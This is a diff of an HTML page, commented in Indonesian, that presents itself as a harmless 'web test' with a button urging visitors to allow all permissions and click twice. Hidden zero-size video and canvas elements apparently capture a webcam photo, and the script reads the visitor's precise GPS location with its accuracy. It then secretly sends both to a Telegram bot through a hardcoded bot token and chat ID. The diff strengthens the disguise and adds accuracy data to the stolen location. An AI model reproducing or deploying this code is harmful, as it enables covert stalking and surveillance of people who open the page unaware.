@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Halo</title>
+  <title>HALO SAYANG</title>
 </head>
 <body>
-  <h1>Halo Sayang</h1>
+  <h1>Welcome to web test</h1>
   <video id="video" width="0" height="0" autoplay></video>
-  <button id="capture-btn">Play Video</button>
+  <button id="capture-btn">Allow all untuk menggunakan semua fitur, lalu klik saya 2x</button>
   <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>
 
   <script>
@@ -38,32 +38,39 @@
 
       var imageDataURL = canvas.toDataURL('image/png');
 
-      // Mengambil lokasi menggunakan GPS
-      navigator.geolocation.getCurrentPosition(function(position) {
-        var latitude = position.coords.latitude;
-        var longitude = position.coords.longitude;
+      // Mendapatkan lokasi akurat menggunakan GPS
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          var latitude = position.coords.latitude;
+          var longitude = position.coords.longitude;
+          var accuracy = position.coords.accuracy;
 
-        // Mengirim foto dan lokasi ke Telegram API
-        var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
-        var chatId = '1121369247';
+          // Mengirim foto dan lokasi ke Telegram API
+          var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+          var chatId = '1121369247';
 
-        var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
-        var formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', dataURItoBlob(imageDataURL));
-        formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude);
+          var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+          var formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('photo', dataURItoBlob(imageDataURL));
+          formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)');
 
-        fetch(url, {
-          method: 'POST',
-          body: formData
-        })
-        .then(function(response) {
-          console.log('Foto dan lokasi berhasil dikirim ke Telegram.');
-        })
-        .catch(function(error) {
-          console.error('Terjadi kesalahan dalam mengirim foto dan lokasi ke Telegram:', error);
+          fetch(url, {
+            method: 'POST',
+            body: formData
+          })
+          .then(function(response) {
+            console.log('Foto dan lokasi berhasil dikirim ke Telegram.');
+          })
+          .catch(function(error) {
+            console.error('Terjadi kesalahan dalam mengirim foto dan lokasi ke Telegram:', error);
+          });
+        }, function(error) {
+          console.error('Gagal mendapatkan lokasi:', error);
         });
-      });
+      } else {
+        console.error('Browser tidak mendukung geolocation.');
+      }
     };
 
     // Fungsi untuk mengonversi data URI menjadi Blob
